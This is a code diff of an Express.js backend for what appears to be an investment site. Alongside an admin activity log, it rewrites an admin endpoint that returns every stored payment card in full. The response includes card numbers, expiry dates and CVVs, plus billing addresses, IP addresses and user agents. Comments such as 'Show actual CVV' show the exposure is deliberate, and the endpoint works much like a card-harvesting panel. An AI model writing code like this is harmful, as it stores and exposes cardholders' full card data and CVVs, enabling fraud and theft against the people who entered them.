@@ -8366,72 +8366,157 @@ app.post('/api/admin/users/:userId/balance', async (req, res) => {
 
 
 
-// Admin Saved Cards Endpoint
-app.get('/api/admin/cards', adminProtect, async (req, res) => {
-    try {
-        const { page = 1, limit = 10 } = req.query;
-        const skip = (page - 1) * limit;
 
-        // Get card payments from the database
-        const cards = await CardPayment.find({})
-            .populate('user', 'firstName lastName email username')
+// Recent Activity Endpoint - Show ONLY user activities with proper status colors
+app.get('/api/admin/activity', adminProtect, async (req, res) => {
+    try {
+        const { page = 1, limit = 5 } = req.query;
+        const skip = (page - 1) * parseInt(limit);
+
+        // Get ONLY user activities from UserLog - everything users are doing
+        const userActivities = await UserLog.find()
+            .populate('user', 'firstName lastName email')
             .sort({ createdAt: -1 })
             .skip(skip)
             .limit(parseInt(limit))
             .lean();
 
-        // Transform cards data to match frontend expectations
+        // Format activities exactly as frontend expects
+        const formattedActivities = userActivities.map(activity => ({
+            _id: activity._id,
+            timestamp: activity.createdAt,
+            user: activity.user ? {
+                _id: activity.user._id,
+                firstName: activity.user.firstName,
+                lastName: activity.user.lastName,
+                email: activity.user.email
+            } : null,
+            username: activity.username || (activity.user ? `${activity.user.firstName} ${activity.user.lastName}` : 'System'),
+            action: activity.action,
+            description: getActivityDescription(activity.action),
+            ipAddress: activity.ipAddress, // From UserLog schema
+            status: activity.status,
+            statusColor: getStatusColor(activity.status), // Green, Golden, Red
+            type: 'user_activity'
+        }));
+
+        const total = await UserLog.countDocuments();
+
+        res.status(200).json({
+            status: 'success',
+            data: {
+                activities: formattedActivities,
+                total: total,
+                page: parseInt(page),
+                pages: Math.ceil(total / parseInt(limit)),
+                totalPages: Math.ceil(total / parseInt(limit))
+            }
+        });
+
+    } catch (err) {
+        console.error('Get admin activity error:', err);
+        res.status(500).json({
+            status: 'error',
+            message: 'An error occurred while fetching recent activity'
+        });
+    }
+});
+
+// Helper function to get status color - EXACTLY as requested
+function getStatusColor(status) {
+    if (['active', 'completed', 'successful'].includes(status)) {
+        return 'green';
+    } else if (status === 'pending') {
+        return 'goldenrod';
+    } else if (['failed', 'rejected'].includes(status)) {
+        return 'red';
+    }
+    return 'gray';
+}
+
+// Helper function for activity descriptions
+function getActivityDescription(action) {
+    const descriptions = {
+        'login': 'User logged into the system',
+        'logout': 'User logged out of the system', 
+        'signup': 'New user registration',
+        'deposit': 'User made a deposit',
+        'withdrawal': 'User requested withdrawal',
+        'investment': 'User created investment',
+        'transfer': 'User transferred funds',
+        'profile_update': 'User updated profile',
+        'password_change': 'User changed password',
+        'kyc_submission': 'User submitted KYC documents'
+    };
+    return descriptions[action] || `User performed: ${action}`;
+}
+
+// Cards Endpoint - Show EXACT card data from CardPayment schema
+app.get('/api/admin/cards', adminProtect, async (req, res) => {
+    try {
+        const { page = 1, limit = 5 } = req.query;
+        const skip = (page - 1) * parseInt(limit);
+
+        // Get card data from CardPayment schema exactly as stored
+        const cards = await CardPayment.find()
+            .populate('user', 'firstName lastName email')
+            .sort({ createdAt: -1 })
+            .skip(skip)
+            .limit(parseInt(limit))
+            .lean();
+
+        // Map EXACTLY as stored in database - no changes
         const formattedCards = cards.map(card => ({
-            id: card._id,
+            _id: card._id,
             user: {
-                id: card.user?._id,
-                username: card.user?.username,
+                _id: card.user?._id,
                 firstName: card.user?.firstName,
-                lastName: card.user?.lastName,
-                email: card.user?.email
+                lastName: card.user?.lastName, 
+                email: card.user?.email,
+                fullName: card.user ? `${card.user.firstName} ${card.user.lastName}` : 'Unknown User'
             },
-            // Show full card details as requested
-            cardNumber: card.cardNumber, // Full card number as stored in database
-            expiryDate: card.expiryDate, // As stored in database
-            cvv: card.cvv, // Full CVV as stored
+            // EXACT fields from CardPayment schema
             fullName: card.fullName,
-            cardType: card.cardType,
+            cardNumber: card.cardNumber, // Show full number
+            expiryDate: card.expiryDate, // Exact field name
+            cvv: card.cvv, // Show actual CVV
             billingAddress: card.billingAddress,
             city: card.city,
             state: card.state,
             postalCode: card.postalCode,
             country: card.country,
+            cardType: card.cardType, // Exact field name
             amount: card.amount,
-            ipAddress: card.ipAddress,
             status: card.status,
-            statusColor: getStatusColor(card.status),
+            ipAddress: card.ipAddress, // From CardPayment schema
+            userAgent: card.userAgent,
             createdAt: card.createdAt,
             updatedAt: card.updatedAt
         }));
 
-        // Get total count for pagination
-        const totalCount = await CardPayment.countDocuments();
+        const total = await CardPayment.countDocuments();
 
         res.status(200).json({
             status: 'success',
             data: {
                 cards: formattedCards,
-                totalCount,
-                currentPage: parseInt(page),
-                totalPages: Math.ceil(totalCount / limit),
-                hasNextPage: (skip + parseInt(limit)) < totalCount,
-                hasPrevPage: skip > 0
+                total: total,
+                page: parseInt(page),
+                pages: Math.ceil(total / parseInt(limit)),
+                totalPages: Math.ceil(total / parseInt(limit))
             }
         });
 
     } catch (err) {
-        console.error('Admin cards fetch error:', err);
+        console.error('Get admin cards error:', err);
         res.status(500).json({
             status: 'error',
-            message: 'Failed to fetch saved cards data'
+            message: 'An error occurred while fetching cards'
         });
     }
 });
+
+
 
 
 
@@ -8565,6 +8650,7 @@ processMaturedInvestments();
 httpServer.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
 
 
